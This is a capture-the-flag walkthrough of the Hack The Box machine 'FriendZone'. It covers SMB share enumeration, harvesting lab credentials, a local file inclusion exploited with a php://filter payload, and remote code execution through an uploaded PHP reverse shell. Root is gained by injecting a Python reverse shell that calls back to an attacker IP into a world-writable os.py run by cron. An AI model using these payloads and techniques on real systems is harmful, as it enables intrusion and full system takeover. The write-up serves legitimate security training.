```
As we can see there are a lot of services running on this box.  
As first thing, we can try to enumerate the samba share and see if there is any shares available and if the share contains any sensitive information.  
Let's start enumerating SMB service with smbmap, so that we can crawl and identify file shares.  
```
[root@kali FriendZone ]$ smbmap -H $TARGET
[+] Guest session       IP: 10.10.10.123:445    Name: friendzoneportal.red

        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files

```
As we can notice there are two shares that we can access: one is general, with read only permissions and the other is Development.  
As we can see Files share in mounted on /etc/Files, so we can guess that the same path is being used for other shares also.  
with smbmap we can also enumerate shares recursively, specifying the depth of the recursion
```
[root@kali FriendZone ]$ smbmap -H $TARGET -R --depth 5

```
As we can see we get a list of file in that share.  
Now we can connect to smb share and retrievie the .txt file using smbclient:  
```
[root@kali FriendZone ]$ smbclient //$TARGET/general
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.

```
The creds file contains admin credentials.
```
[root@kali FriendZone ]$ cat creds.txt            
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
We can guess this credentials are related to some sort of web service, so let's start enumerating port 80/443.
As we open port 80 we can see a picture with a statement ```Email us at: info@friendzoneportal.red``` changing the host header/enumerate directories does not show anything, so we can suppose that all the services are running over https (443).  
Before jump into the enumeration of port 443, since port 53 is opened we want to try to perform a DNS zone transfer for two zones: friendzoneportal.red (shown on http page) and friendzone.red (shown in the certificate issue).  
```

```  
Now that we have all the domain names we can build up a list and use aquatone to get an overview of what all this sites contains.  
```

Wrote HTML report to: aquatone_report.html
```
As we can infer, this tool takes screenshots of all the subdomains contained in tmp file and generates reports in various formats.  
We can now open the html repor and inspect it.  
After we open it, we can see that only two portals are prompting for a login: https://admin.friendzoneportal.red/ and https://administrator1.friendzone.red/.
https://admin.friendzoneportal.red/ seems to be a fake login page and every credentials we input the site responds with something like 'page under construction'.  
the second allow us lo log in using credentials found on the smb service.  
here we can navigate to '/dashboard' and here we can see the following:  

## Foothold
After we log in into the portal, we can see the following statement
```
image_name param is missed !
please enter it to show the image
default is image_id=a.jpg&pagename=timestamp
```
so, if we try to set the parameter we are shown a picture, a.jpg and the following: ```Final Access timestamp is 1642521979```.
So, we can assume that the page is somehow including a page that profide timestamp.  
If we try to include, for example, login, we get ```Wrong!``` that is the same response that gets returned when an incorrect credential is given to login page.  
As a further evidence, we can also try to include ```dashboard``` this will include the page recursively and lock the webserver.  
So, it seems like we have a LFI vulnerability.  
If we try to include any system file the include fails.  
Now, let's try to download the code using the following php wrapper:  
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login
```
PHP comes with many [built-in wrappers](https://www.php.net/manual/en/wrappers.php) for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize().  
In this case we are using php:// wrapper that allows us to access various I/O streams.  
We can use convert.* filters to processing all stream data through the base64_encode() and base64_decode() functions respectively.  
So as a result we can inject this conversion wrappers in the include() function and get the base64 encoded php source code.  
As we cans see in the dashboard.php source code we have an include for a file from the GET parameter, and the .php extension is added directly within the code
```
include($_GET["pagename"].".php");
```
Now we need to transform the discovered LFI into RCE.  
To do so, if we remember, way back we discovered a /Developer samba share that we can write into.  
since the File share is mounted on ```/etc/Files``` we can guess that the Developer share is mounted in ```/etc/Development```.
Let's upload a reverse shell there and try to include it using the LFI:
```
[root@kali FriendZone ]$ smbclient //$TARGET/Development
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (47.5 kb/s) (average 47.5 kb/s)

                9221460 blocks of size 1024. 6443916 blocks available
smb: \>
```
now lets request the following:
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```
And we get a shell.
```

## User
Poking around on the site, we can find the following file under ```/var/www/mysql_data.conf```
```
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
if we try these credentials with SSH, we can login as user friend:
```
[root@kali FriendZone ]$ ssh -l friend $TARGET

```

## Root
First thing, as always we run linpeas.sh to enumerate the system for a privilege escalation.  
Since we do not found anything using linpeas.sh let's use pspy to snoop process and see if there is any cron running as root that is somehow exploitable.  
After a while we can see that this cron gets executed
```
2022/01/18 12:58:01 CMD: UID=0    PID=38713  | /usr/sbin/CRON -f
2022/01/18 13:00:01 CMD: UID=0    PID=38720  | /usr/bin/python /opt/server_admin/reporter.py
```
If we inspect the file, we can see that the script is owned by root and is not writable by the user friend.  
```
friend@FriendZone:/opt/server_admin$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 24  2019 .
drwxr-xr-x 3 root root 4096 Oct  6  2018 ..
-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
```
If we read the script, we can see the following content, actually nothing gets executed, so at a first glance seems that we cannot hijack the execution of this script.  
```
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
Actually, the only relevant thing that we can see is the ```import os``` statement.  
So, we can try to edit the library with malicious code, so that wen it gets executed it execute a reverse shell (as root).
Let's locate the library and check the permissions.  
```
friend@FriendZone:/opt/server_admin$ locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
```
As we can see os.py is world writable, so let's inject our reverse shell.
From [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) let's use the following shell:  
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
let's edit it as follows, so that we can inject it directly in the library.
```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.10",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
As we are running the reverse shell directly within the os library, we'll need to remove ```os.``` as the functions are available directly into the code where this snippet resides.  
Obviously we should remove also os from the list of the import.  
```
import socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.10",4444));
dup2(s.fileno(),0);
dup2(s.fileno(),1);
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
Now all we need to do, it to wait for cron to execute, and we gain a shell as root.
```
root@kali:~/Documents/HTB/Boxes/FriendZone# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.123] 44684
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
